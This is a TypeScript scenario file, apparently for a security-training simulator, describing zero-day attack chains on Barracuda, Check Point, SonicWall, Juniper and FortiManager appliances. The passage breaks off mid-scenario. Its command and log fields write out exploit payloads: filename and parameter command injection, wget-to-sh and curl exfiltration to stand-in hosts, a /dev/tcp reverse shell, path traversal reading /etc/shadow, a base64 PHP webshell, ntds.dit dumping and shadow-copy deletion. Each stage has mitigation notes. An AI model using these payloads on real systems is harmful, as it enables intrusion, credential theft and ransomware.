import { LegacyDraftScenario } from './normalize-legacy-draft-scenario';

export const APT_BATCH7_ZERODAY_APPLIANCES_SCENARIOS: LegacyDraftScenario[] = [
  {
    id: 'barracuda-esg-cve-2023-2868-unc4841',
    title: 'Barracuda ESG .tar Attachment RCE & SALTWATER / SUBMARINE Implants (CVE-2023-2868)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2023-2868',
    description:
      'UNC4841 sends crafted .tar email attachments containing backtick shell metacharacters in the member filename to Barracuda Email Security Gateway (ESG) appliances, exploiting Amavis Perl qx{} command injection (CVE-2023-2868) to deploy SALTWATER, SEASPY, and the SQLite-resident SUBMARINE rootkit.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'UNC4841 SMTP Sender & C2 Relay', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Barracuda ESG (Amavis .tar Scanner)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'ESG bsmtpd Daemon & SQLite Trigger', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Mandiant / CISA Forensics Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Mailboxes & Domain Trusts', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Crafted .tar Attachment Filename Perl qx{} Injection (CVE-2023-2868)',
        narration:
          'UNC4841 sends an SMTP email with a specially formatted .tar attachment whose internal filename embeds backticks (`...`). When the Barracuda ESG Amavis mail scanner invokes a Perl script that passes the unsanitized filename into a qx{} shell execution block, root commands execute on the appliance.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'SMTP Attachment: payload.tar containing filename `echo Base64Sh | base64 -d | sh`',
          'Vulnerable Amavis Perl Call: qx{/usr/bin/file $unsanitized_tar_entry_name}',
        ],
        defenseMitigation:
          'Immediately isolate and replace compromised Barracuda ESG appliances per CISA/Barracuda guidance and sanitize archive member filenames before invoking external shell utilities.',
        logs: [
          {
            id: 'barra-1',
            timestamp: '02:14:09.112',
            source: 'WAF',
            severity: 'critical',
            raw: 'Barracuda ESG Amavis Mail Log | Message-ID: <20230518.unc4841@mx.example.com> | Attachment: report.tar | MemberFileName: `\x63\x75\x72\x6c ... | sh` | Result: Root Command Execution via CVE-2023-2868',
            parsedFields: {
              VulnerableComponent: 'Amavis .tar archive header scanner',
              ExploitedCve: 'CVE-2023-2868',
              ThreatActor: 'UNC4841',
              ExecutionContext: 'root (Barracuda ESG Linux OS)',
            },
          },
        ],
        packets: [
          {
            id: 'barra-pkt-1',
            timestamp: '02:14:08.950',
            protocol: 'TCP',
            sourceIp: '198.51.100.44',
            destIp: '203.0.113.25',
            port: 25,
            flag: 'PSH-ACK',
            payloadSize: 2048,
            hexDump: '43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 2D 74 61 72 3B 20 6E 61 6D 65 3D 22 72 65 70 6F 72 74 2E 74 61 72 22',
            decodedString: 'SMTP DATA: Content-Type: application/x-tar; tar header name field: `wget -qO- http://198.51.100.44/s | sh`',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: SALTWATER Trojanized bsmtpd Module & SEASPY PCAP Backdoor',
        narration:
          'UNC4841 deploys SALTWATER (a trojanized shared library injected into the Barracuda SMTP daemon bsmtpd) and SEASPY (a persistent service disguised as BarracudaMailService that monitors port 25 traffic via libpcap for magic C2 packets).',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Persistence & Defense Evasion (T1574.006 - Dynamic Linker Hijacking / T1205.001)',
        technicalCommands: [
          'SALTWATER: Trojanized /usr/local/barracuda/bin/bsmtpd hooking recv() & send() channels',
          'SEASPY: /sbin/BarracudaMailService eth0 (libpcap passive magic packet listener on TCP/25)',
        ],
        defenseMitigation:
          'Verify cryptographic integrity of all `/usr/local/barracuda/bin/*` binaries and `/lib/modules/*` kernel modules from an offline rescue medium.',
        logs: [
          {
            id: 'barra-2',
            timestamp: '02:18:33.504',
            source: 'EDR',
            severity: 'critical',
            EventCode: 7,
            ProcessName: 'bsmtpd',
            raw: 'Appliance Integrity Alert | Binary: /usr/local/barracuda/bin/bsmtpd | Implant: SALTWATER + SEASPY (/sbin/BarracudaMailService) | Behavior: Hooking SMTP socket descriptors and passive libpcap port 25 packet sniffing',
            parsedFields: {
              PrimaryImplant: 'SALTWATER (Trojanized bsmtpd module)',
              SecondaryImplant: 'SEASPY (libpcap passive C2 listener)',
              PersistencePath: '/etc/init.d/BarracudaMailService',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: SUBMARINE SQLite Trigger Persistence & Bulk MIME Exfiltration',
        narration:
          'When Barracuda pushes emergency cleanup scripts, UNC4841 counters by deploying SUBMARINE—embedding persistent shell commands inside a SQLite database trigger (/mail/mlog/sql/mlog.sqlite) owned by root—and exfiltrates sensitive government/enterprise MIME emails.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Persistence & Exfiltration (T1505 / T1114.002 - Email Collection)',
        technicalCommands: [
          'SQLite Trigger Persistence: CREATE TRIGGER submarine_exec AFTER INSERT ON mlog ... (/mail/mlog/sql/mlog.sqlite)',
          'tar -czf - /mail/spool/* | openssl enc -aes-256-cbc -k $KEY | curl -T - https://c2-relay.example/up',
        ],
        defenseMitigation:
          'Decommission and replace affected ESG virtual/hardware appliances completely rather than relying on in-place software patching after root-level SQLite and kernel compromise.',
        logs: [
          {
            id: 'barra-3',
            timestamp: '03:05:11.882',
            source: 'EDR',
            severity: 'critical',
            raw: 'CISA MAR-10454006.r1.v2 Alert | Implant: SUBMARINE | Artifact: /mail/mlog/sql/mlog.sqlite (Malicious SQLite Trigger + /etc/cron.d/core_check) | Action: Survives firmware patch and stages outbound tar.gz email spool exfiltration',
            parsedFields: {
              StealthImplant: 'SUBMARINE (SQLite Database Trigger Backdoor)',
              DatabasePath: '/mail/mlog/sql/mlog.sqlite',
              ExfiltratedData: 'Enterprise SMTP Spool & Domain Credentials',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'check-point-vpn-cve-2024-24919-info-leak',
    title: 'Check Point Security Gateway /clients/MyCRL Path Traversal & AD Compromise (CVE-2024-24919)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2024-24919',
    description:
      'Threat actors exploit an unauthenticated path traversal zero-day (CVE-2024-24919) in the /clients/MyCRL endpoint of Check Point Security Gateways with IPSec VPN or Mobile Access blades enabled, reading /etc/shadow and $FWDIR/conf/objects_5_0.C as root to extract VPN and Active Directory service credentials and dump ntds.dit.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Threat Actor (POST /clients/MyCRL)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Check Point Gateway (vpnd root daemon)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Gateway Filesystem (/etc/shadow & objects_5_0.C)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'watchTowr / Mnemonic MDR Telemetry', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Active Directory DC (ntds.dit Extraction)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Path Traversal POST Request to /clients/MyCRL (CVE-2024-24919)',
        narration:
          'The attacker sends a crafted HTTP POST request to /clients/MyCRL with body payload aCSHELL/../../../../../../../etc/shadow. Because the Check Point VPN daemon (vpnd) concatenates the POST body directly into an fopen() path without stripping ../ sequences and runs as root, any file on the appliance can be read.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'POST /clients/MyCRL HTTP/1.1',
          'Body: aCSHELL/../../../../../../../etc/shadow',
        ],
        defenseMitigation:
          'Apply Check Point Security Gateway hotfix for CVE-2024-24919 immediately, disable unused Mobile Access / Remote Access VPN blades, and enforce MFA on all VPN accounts.',
        logs: [
          {
            id: 'cp-1',
            timestamp: '19:42:10.115',
            source: 'WAF',
            severity: 'critical',
            raw: 'Check Point Gateway HTTP Log | Method: POST | URI: /clients/MyCRL | BodyPrefix: aCSHELL/../../../../../../../etc/shadow | Daemon: vpnd (UID: 0) | Status: 200 OK (File Contents Returned)',
            parsedFields: {
              VulnerableEndpoint: '/clients/MyCRL',
              TraversalPayload: 'aCSHELL/../../../../../../../etc/shadow',
              ExploitedCve: 'CVE-2024-24919',
              DaemonPrivilege: 'root (UID 0)',
            },
          },
        ],
        packets: [
          {
            id: 'cp-pkt-1',
            timestamp: '19:42:10.100',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.119',
            destIp: '203.0.113.10',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 312,
            hexDump: '50 4F 53 54 20 2F 63 6C 69 65 6E 74 73 2F 4D 79 43 52 4C 20 48 54 54 50 2F 31 2E 31 0D 0A 0D 0A 61 43 53 48 45 4C 4C 2F 2E 2E 2F 2E 2E 2F 2E 2E 2F 65 74 63 2F 73 68 61 64 6F 77',
            decodedString: 'POST /clients/MyCRL HTTP/1.1 | Body: aCSHELL/../../../../../../../etc/shadow -> Returns root & local VPN password hashes',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Harvesting /etc/shadow, SSH Keys & AD LDAP Bind Credentials',
        narration:
          'The attacker systematically reads /etc/shadow (cracking legacy password-only local VPN accounts), /home/admin/.ssh/id_rsa, and Check Point configuration databases ($FWDIR/conf/objects_5_0.C and $FWDIR/database/fwauth.NDB) containing Active Directory LDAP bind credentials.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1552.001 - Credentials In Files)',
        technicalCommands: [
          'curl -sk -X POST https://vpn.corp.example/clients/MyCRL -d "aCSHELL/../../../../../../../opt/CPsuite-R81.20/fw1/conf/objects_5_0.C"',
          'hashcat -m 1800 shadow.hashes wordlist.txt (Cracks local VPN user password)',
        ],
        defenseMitigation:
          'Remove legacy local password-only VPN user definitions and rotate the Active Directory LDAP bind service account password stored on the firewall.',
        logs: [
          {
            id: 'cp-2',
            timestamp: '19:43:04.602',
            source: 'WAF',
            severity: 'critical',
            raw: 'Gateway Arbitrary File Read Sequence | FilesRead: /etc/shadow, /opt/CPsuite-R81.20/fw1/conf/objects_5_0.C, /opt/CPsuite-R81.20/fw1/database/fwauth.NDB | ExtractedSecrets: Local VPN Hashes + AD LDAP Bind Account (svc_cp_ldap)',
            parsedFields: {
              ExfiltratedConfigs: 'objects_5_0.C, fwauth.NDB, /etc/shadow',
              CompromisedAccounts: 'Local VPN User + svc_cp_ldap (AD Bind Account)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: VPN Tunnel Establishment & Active Directory ntds.dit Extraction',
        narration:
          'Authenticating to the Check Point Remote Access VPN with the cracked local account and leveraging the privileged Active Directory service account extracted from the gateway configuration, the attacker pivots to the internal Domain Controller and uses vssadmin / ntdsutil to extract ntds.dit.',
        activeNodes: ['attacker', 'firewall', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.003 - NTDS)',
        technicalCommands: [
          'VPN Login: Check Point IPSec/SSL VPN session established via local password-only user',
          'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\AD" q q',
        ],
        defenseMitigation:
          'Enforce least privilege on firewall LDAP bind accounts (read-only domain user, never Domain Admin) and monitor Domain Controllers for IFM/VSS creation of ntds.dit.',
        logs: [
          {
            id: 'cp-3',
            timestamp: '21:18:55.901',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'ntdsutil.exe',
            CommandLine: 'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\AD" q q',
            raw: 'EventID: 1 | Host: DC01.corp.local | User: CORP\\svc_cp_ldap | Image: C:\\Windows\\System32\\ntdsutil.exe | CommandLine: ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\AD" q q | Note: Full AD database dump within 2 hours of CVE-2024-24919 exploit',
            parsedFields: {
              PivotIdentity: 'CORP\\svc_cp_ldap',
              TargetHost: 'DC01.corp.local',
              DumpedArtifact: 'C:\\Temp\\AD\\Active Directory\\ntds.dit + registry\\SYSTEM',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'sonicwall-sslvpn-cve-2024-40766-akira',
    title: 'SonicWall SonicOS SSLVPN Access Control Bypass & Akira/Fog Ransomware (CVE-2024-40766)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2024-40766',
    description:
      'Akira and Fog ransomware affiliates exploit an improper access control vulnerability in SonicWall SonicOS SSLVPN (CVE-2024-40766) and migrated Gen6-to-Gen7 local credential configurations to hijack VPN sessions, establish Impacket/RDP lateral movement, and encrypt enterprise virtual machines.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Akira / Fog VPS Infrastructure', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'SonicWall Firewall (SonicOS SSLVPN)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Internal Windows Server (Impacket SMB)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Arctic Wolf / Rapid7 MDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Hyper-V / ESXi & Domain Shares', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SonicOS SSLVPN Improper Access Control Exploitation (CVE-2024-40766)',
        narration:
          'The attacker targets the WAN-facing SonicWall SSLVPN portal (typically on TCP port 4433), exploiting CVE-2024-40766 to bypass access control checks and extract or authenticate with unrotated Gen6-to-Gen7 local SSLVPN user accounts.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 / T1133 - External Remote Services)',
        technicalCommands: [
          'GET /cgi-bin/sslvpnclient?launchplatform=... HTTP/1.1 (CVE-2024-40766 SonicOS SSLVPN resource access bypass)',
          'SSLVPN Virtual IP Assignment: 10.212.134.105 allocated to unauthorized session',
        ],
        defenseMitigation:
          'Upgrade SonicOS to patched firmware (7.0.1-5035+ / 6.5.4.15-116n+), force password resets on all local SonicWall SSLVPN users (especially those migrated from Gen 6 to Gen 7), and enforce TOTP MFA.',
        logs: [
          {
            id: 'sonic-1',
            timestamp: '01:08:19.442',
            source: 'Firewall',
            severity: 'critical',
            raw: 'SonicOS SSLVPN Alert | Event: SSL VPN Session Established | SourceIP: 45.86.201.14 (VPS ASN) | Port: 4433 | AssignedVirtualIP: 10.212.134.105 | AuthNote: CVE-2024-40766 Improper Access Control / Unrotated Local Account',
            parsedFields: {
              Appliance: 'SonicWall TZ / NSA Series (SonicOS)',
              ExploitedCve: 'CVE-2024-40766',
              AssignedVpnIp: '10.212.134.105',
              AttackerSourceIp: '45.86.201.14',
            },
          },
        ],
        packets: [
          {
            id: 'sonic-pkt-1',
            timestamp: '01:08:19.120',
            protocol: 'HTTPS',
            sourceIp: '45.86.201.14',
            destIp: '198.51.100.200',
            port: 4433,
            flag: 'PSH-ACK',
            payloadSize: 640,
            hexDump: '47 45 54 20 2F 63 67 69 2D 62 69 6E 2F 73 73 6C 76 70 6E 63 6C 69 65 6E 74 20 48 54 54 50 2F 31 2E 31 0D 0A 43 6F 6F 6B 69 65 3A 20 73 77 61 70 3D',
            decodedString: 'GET /cgi-bin/sslvpnclient HTTP/1.1 (Port 4433) | CVE-2024-40766 Access Control Bypass',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Network Scanning, Impacket SMB Execution & AnyDesk Persistence',
        narration:
          'Inside the SSLVPN tunnel, the operator runs Advanced IP Scanner and nltest, uses Impacket wmiexec.py / smbexec.py to pivot onto internal Windows servers, and installs AnyDesk or Cloudflared tunnels for redundant C2.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Lateral Movement & Command and Control (T1021.002 / T1219)',
        technicalCommands: [
          'nltest /dclist:corp.local && net group "Domain Admins" /domain',
          'python3 wmiexec.py CORP/admin@10.10.20.15 "msiexec /i AnyDesk.msi /qn"',
        ],
        defenseMitigation:
          'Restrict SSLVPN client address pools from reaching SMB (TCP 445), WMI/RPC (TCP 135), and RDP (TCP 3389) on server subnets without step-up Zero-Trust verification.',
        logs: [
          {
            id: 'sonic-2',
            timestamp: '01:22:47.310',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cmd.exe',
            CommandLine: 'cmd.exe /Q /c nltest /dclist:corp.local 1> \\\\127.0.0.1\\ADMIN$\\__1724501122.41 2>&1',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe | Image: C:\\Windows\\System32\\cmd.exe | CommandLine: cmd.exe /Q /c nltest /dclist:corp.local 1> \\\\127.0.0.1\\ADMIN$\\__1724501122.41 2>&1 | SourceIP: 10.212.134.105 (SSLVPN Pool)',
            parsedFields: {
              LateralTool: 'Impacket wmiexec.py (WmiPrvSE.exe -> cmd.exe)',
              SourceVpnIp: '10.212.134.105',
              OutputRedirectPattern: '\\\\127.0.0.1\\ADMIN$\\__<timestamp>',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: PowerShell CIM Shadow Copy Deletion & Akira/Fog Encryption',
        narration:
          'After exfiltrating sensitive files via Rclone/WinSCP, the attacker runs PowerShell Get-CimInstance Win32_ShadowCopy | Remove-CimInstance to wipe Volume Shadow Copies and launches the Akira (`akira.exe`) or Fog ransomware payload across Windows and ESXi hosts.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1490 - Inhibit System Recovery / T1486)',
        technicalCommands: [
          'powershell.exe -Command "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance"',
          'akira.exe -p="\\\\fileserver\\finance" -n (ChaCha20 + RSA-4096 encryption appending .akira / .fog)',
        ],
        defenseMitigation:
          'Block WMI/CIM shadow copy deletion via ASR/EDR behavioral rules and maintain immutable offline backups isolated from Active Directory credentials.',
        logs: [
          {
            id: 'sonic-3',
            timestamp: '02:05:12.809',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -Command "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance"',
            raw: 'EDR Ransomware Behavioral Alert | Process: powershell.exe | Action: CIM Win32_ShadowCopy Deletion | FollowUpProcess: C:\\ProgramData\\akira.exe -p="\\\\fileserver\\finance" | AppendedExtension: .akira',
            parsedFields: {
              ShadowWipeCommand: 'Get-CimInstance Win32_ShadowCopy | Remove-CimInstance',
              RansomwareBinary: 'C:\\ProgramData\\akira.exe',
              EncryptedExtension: '.akira / .fog',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'juniper-junos-jweb-cve-2023-36845-chain',
    title: 'Juniper Junos OS J-Web PHPRC=/dev/fd/0 Fileless RCE (CVE-2023-36845)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2023-36845',
    description:
      'Attackers exploit an unauthenticated PHP environment variable manipulation flaw (CVE-2023-36845) in the Appweb CGI handler of Juniper SRX firewalls and EX switches, setting PHPRC=/dev/fd/0 in the query string so php-cgi parses auto_prepend_file=php://input directly from the HTTP POST body for fileless RCE.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Exploit Client (PHPRC=/dev/fd/0)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Juniper SRX / EX (J-Web Appweb CGI)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'FreeBSD php-cgi Process (stdin fd/0)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'watchTowr / VulnCheck IDS Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Junos Config (/config/juniper.conf.gz)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Appweb CGI Query-String Environment Variable Injection (PHPRC=/dev/fd/0)',
        narration:
          'The attacker sends an unauthenticated HTTP POST request to /?PHPRC=/dev/fd/0 on the Juniper J-Web interface. The underlying Appweb web server populates process environment variables from query parameters before spawning php-cgi, instructing PHP to read its php.ini directives from file descriptor 0 (standard input, which holds the HTTP POST body).',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'POST /?PHPRC=/dev/fd/0 HTTP/1.1',
          'Appweb CGI Environment Injection: setenv("PHPRC", "/dev/fd/0") prior to execve("/usr/sbin/php-cgi")',
        ],
        defenseMitigation:
          'Disable the J-Web management interface on WAN interfaces (`delete system services web-management`) and upgrade Junos OS to patched releases.',
        logs: [
          {
            id: 'junos-1',
            timestamp: '06:30:11.204',
            source: 'WAF',
            severity: 'critical',
            raw: 'Juniper J-Web Access Log | POST /?PHPRC=/dev/fd/0 HTTP/1.1 | SourceIP: 198.51.100.62 | TargetScript: /www/index.php | Note: Unauthenticated PHP environment variable override (CVE-2023-36845)',
            parsedFields: {
              VulnerableServer: 'Embedthis Appweb CGI (Juniper J-Web)',
              InjectedEnvVar: 'PHPRC=/dev/fd/0',
              ExploitedCve: 'CVE-2023-36845',
            },
          },
        ],
        packets: [
          {
            id: 'junos-pkt-1',
            timestamp: '06:30:11.190',
            protocol: 'HTTPS',
            sourceIp: '198.51.100.62',
            destIp: '203.0.113.88',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '50 4F 53 54 20 2F 3F 50 48 50 52 43 3D 2F 64 65 76 2F 66 64 2F 30 20 48 54 54 50 2F 31 2E 31 0D 0A 0D 0A 61 6C 6C 6F 77 5F 75 72 6C 5F 69 6E 63 6C 75 64 65 3D 31',
            decodedString: 'POST /?PHPRC=/dev/fd/0 HTTP/1.1 | Body: allow_url_include=1\\nauto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtK..."',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Fileless In-Memory PHP Execution via auto_prepend_file=data://',
        narration:
          'Inside the HTTP POST body read from /dev/fd/0, the attacker supplies allow_url_include=1 and auto_prepend_file="data://text/plain;base64,...", forcing php-cgi to decode and execute arbitrary PHP code in memory before index.php runs, without writing any temporary file to disk.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution & Defense Evasion (T1059.004 / T1620 - Reflective Code Loading)',
        technicalCommands: [
          'HTTP POST Body (parsed as php.ini): allow_url_include=1',
          'auto_prepend_file="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="',
        ],
        defenseMitigation:
          'Deploy network IDS signatures detecting `PHPRC=`, `/dev/fd/0`, or `auto_prepend_file` in HTTP requests targeting network appliances.',
        logs: [
          {
            id: 'junos-2',
            timestamp: '06:30:11.450',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'php-cgi',
            CommandLine: '/usr/sbin/php-cgi /www/index.php',
            raw: 'FreeBSD Process Telemetry | Parent: /usr/sbin/httpd | Process: /usr/sbin/php-cgi | OpenFD0: pipe:[socket_post_body] | InjectedIni: allow_url_include=1 + auto_prepend_file=data://text/plain;base64,... | ChildProcess: /bin/sh -c id; cat /config/juniper.conf.gz',
            parsedFields: {
              ExecutionTechnique: 'Single-Request Fileless PHPRC=/dev/fd/0 RCE',
              PhpIniDirectives: 'allow_url_include=1, auto_prepend_file=data://...',
              SpawnedShell: '/bin/sh -c',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Junos Configuration Exfiltration (/config/juniper.conf.gz) & Backdoor Admin Creation',
        narration:
          'Executing commands on the underlying FreeBSD-based Junos OS, the attacker exfiltrates /config/juniper.conf.gz (containing $9$ reversible-encrypted secrets, BGP/OSPF keys, and IPSec pre-shared keys) and injects a hidden super-user account or memory resident webshell.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access & Persistence (T1552.001 / T1136.001)',
        technicalCommands: [
          'zcat /config/juniper.conf.gz | grep -E "secret|pre-shared-key|ssh-rsa"',
          'cli -c "configure; set system login user sysmaint class super-user authentication encrypted-password ...; commit"',
        ],
        defenseMitigation:
          'Audit `/config/juniper.conf.gz` and TACACS+/syslog records for unauthorized configuration commits and rotate all `$9$` obfuscated secrets and IPSec PSKs.',
        logs: [
          {
            id: 'junos-3',
            timestamp: '06:31:02.910',
            source: 'Auth',
            severity: 'critical',
            raw: 'Junos UI_COMMIT Alert | User: www (via php-cgi) | Action: Configuration commit | AddedElement: system login user sysmaint class super-user | ExfiltratedFile: /config/juniper.conf.gz',
            parsedFields: {
              ExfiltratedConfig: '/config/juniper.conf.gz ($9$ secrets & IPSec PSKs)',
              PersistenceUser: 'sysmaint (class super-user)',
              ExecutingUid: 'www / root escalation',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'fortimanager-fgd-jump-cve-2024-47575',
    title: 'FortiManager fgfmsd Unauthenticated API RCE ("FortiJump" CVE-2024-47575 / UNC5820)',
    category: 'ZERO_DAY_APPLIANCES',
    mitreId: 'CVE-2024-47575',
    description:
      'UNC5820 exploits a missing authentication zero-day ("FortiJump", CVE-2024-47575) in the FortiGate-to-FortiManager (FGFM) management daemon (fgfmsd on TCP port 541) using a self-signed client certificate to register a rogue serial number, invoke rcs_checkout command injection as root, and steal all managed FortiGate configurations.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'UNC5820 Rogue FGFM Client (TCP/541)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'FortiManager Daemon (fgfmsd Port 541)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'FortiManager Root Shell (rcs_checkout)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Mandiant / Rapid7 Network Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Managed FortiGate Fleet Configs & Hashes', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated FGFM TLS Handshake & Rogue Device Registration (TCP/541)',
        narration:
          'UNC5820 connects to TCP port 541 on the FortiManager appliance presenting any valid or self-signed X.509 certificate and sends a get ip request with an unregistered serial number (e.g., FMG-VM0000000001), bypassing authentication into the fgfmsd message router.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application)',
        technicalCommands: [
          'TLS Handshake to TCP/541 (fgfmsd accepts arbitrary client certificate CN)',
          'FGFM Request: request=get\\nchannel=ip\\nserial=FGVM02TM23009999',
        ],
        defenseMitigation:
          'Enable `set fgfm-deny-unknown enable` under `config system global` on FortiManager, upgrade to patched firmware, and restrict TCP port 541 to known FortiGate WAN IPs.',
        logs: [
          {
            id: 'fmg-1',
            timestamp: '04:12:08.311',
            source: 'Firewall',
            severity: 'critical',
            raw: 'FortiManager fgfmsd Log | Event: Unregistered device connection accepted | Port: 541/TCP | RemoteIP: 195.85.114.78 | ReportedSerial: FGVM02TM23009999 | Hostname: localhost | Note: Missing authentication check (CVE-2024-47575)',
            parsedFields: {
              VulnerableDaemon: 'fgfmsd (FortiGate-to-FortiManager Protocol)',
              Port: '541/TCP',
              RogueSerial: 'FGVM02TM23009999',
              ExploitedCve: 'CVE-2024-47575 ("FortiJump")',
            },
          },
        ],
        packets: [
          {
            id: 'fmg-pkt-1',
            timestamp: '04:12:08.300',
            protocol: 'TCP',
            sourceIp: '195.85.114.78',
            destIp: '203.0.113.54',
            port: 541,
            flag: 'PSH-ACK',
            payloadSize: 384,
            hexDump: '30 30 30 30 30 31 32 30 72 65 71 75 65 73 74 3D 67 65 74 0A 63 68 61 6E 6E 65 6C 3D 69 70 0A 73 65 72 69 61 6C 3D 46 47 56 4D 30 32 54 4D 32 33 30 30 39 39 39 39',
            decodedString: 'FGFM Payload (Port 541): request=get\\nchannel=ip\\nserial=FGVM02TM23009999\\nhostname=localhost',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: FGFM put_json / rcs_checkout Command Injection as Root',
        narration:
          'Once the rogue session is active, the attacker sends an FGFM put_json command invoking the umath_handler / rcs_checkout function with shell metacharacters injected into the file parameter, executing arbitrary OS commands as root.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Unix Shell)',
        technicalCommands: [
          'FGFM Request: action=put_json -> method=rcs_checkout',
          'Injected Parameter: "file": "1; sh -i >& /dev/tcp/195.85.114.78/443 0>&1 #"',
        ],
        defenseMitigation:
          'Monitor FortiManager system logs for unexpected `Unregistered device` entries with `hostname="localhost"` and audit `/var/tmp` or `/tmp` for staged archives.',
        logs: [
          {
            id: 'fmg-2',
            timestamp: '04:12:14.772',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'sh',
            CommandLine: '/bin/sh -c /usr/bin/rcs -l "1; tar -czf /tmp/.tm.tar.gz /var/fwclient/* #"',
            raw: 'FortiManager OS Process Alert | Parent: /bin/fgfmsd (UID: 0) | Function: rcs_checkout | Command: /bin/sh -c /usr/bin/rcs -l "1; tar -czf /tmp/.tm.tar.gz /var/fwclient/* #" | ThreatActor: UNC5820',
            parsedFields: {
              VulnerableFunction: 'rcs_checkout (via fgfmsd put_json)',
              ExecutionPrivilege: 'root (UID 0)',
              StagedArchive: '/tmp/.tm.tar.gz',
              ThreatActor: 'UNC5820',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Exfiltration of Managed FortiGate Configurations (/var/fwclient & globaldb)',
        narration:
